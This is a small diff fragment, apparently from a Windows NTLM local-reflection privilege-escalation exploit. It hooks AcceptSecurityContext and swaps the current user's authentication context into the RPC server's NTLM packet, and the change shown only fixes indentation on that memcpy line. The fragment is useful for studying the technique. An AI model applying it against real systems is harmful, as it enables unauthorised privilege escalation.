@@ -48,7 +48,7 @@ SECURITY_STATUS AcceptSecurityContextHook(PCredHandle phCredential, PCtxtHandle 
 						WaitForSingleObject(event2, INFINITE);
 						// for local auth reflection we don't really need to relay the entire packet 
 						// swapping the context in the Reserved bytes is enough
-					    memcpy(bufferPtr + NTLM_RESERVED_OFFSET, UserContext, 8);
+						memcpy(bufferPtr + NTLM_RESERVED_OFFSET, UserContext, 8);
 						printf("[+] RPC Server Auth Context swapped with the Current User\n");
 					}
 				}
